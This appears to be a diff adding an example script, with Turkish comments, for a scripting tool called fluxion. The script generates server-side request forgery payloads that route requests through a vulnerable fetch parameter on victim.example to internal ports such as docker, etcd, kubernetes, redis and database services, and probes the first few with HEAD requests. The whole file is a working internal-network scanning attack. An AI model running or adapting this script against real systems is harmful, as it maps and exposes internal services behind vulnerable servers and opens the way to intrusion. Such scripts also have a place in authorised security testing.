@@ -1,0 +1,60 @@
+# examples/ssrf_internal_port_matrix.flx
+# Kullanım:
+#   python -m fluxion -s examples/ssrf_internal_port_matrix.flx \
+#     -D base="https://victim.example/fetch?u=" \
+#     -D host="127.0.0.1"
+
+let base = base ?? "https://victim.example/fetch?u="
+let host = host ?? "127.0.0.1"
+
+# Sık görülen servis portları
+let ports = [
+  22,      # ssh
+  80, 81, 443, 4443, 8080, 8443, 9000,        # web
+  2375, 2376,                                  # docker
+  2379, 2380,                                  # etcd
+  5000, 5050, 5601, 9200, 9300,                # apps/search
+  10250, 10255, 6443, 8001,                    # k8s
+  11211, 27017, 6379,                          # memcached/mongo/redis
+  2049,                                        # nfs
+  3000, 4000, 5000, 7001,                      # dev ports
+  25, 110, 143,                                # mail
+  3306, 5432                                   # mysql/postgres
+]
+
+# Basit yol varyantları
+let paths = [
+  "/", "/health", "/version", "/metrics", "/_status", "/api", "/debug/vars"
+]
+
+fn make_url(h, p, path){ return join("http://", h, ":", str(p), path) }
+
+let payloads = []
+for p in ports {
+  for path in paths {
+    let raw = make_url(host, p, path)
+    let wrapped = join(base, url_encode(raw))
+    payloads = payloads + [ wrapped ]
+  }
+}
+
+# Örnek birkaç HEAD
+let probes = []
+let i = 0
+for u in payloads {
+  if (i >= 5) { break }
+  probes = probes + [ {"url": u, "head": http_head(u)} ]
+  i = i + 1
+}
+
+echo value=jsonify({
+  "host": host,
+  "base_prefix": base,
+  "ports": ports,
+  "paths": paths,
+  "count": len(payloads),
+  "sample_probes": probes,
+  "payloads": payloads
+})
+
+return len(payloads)
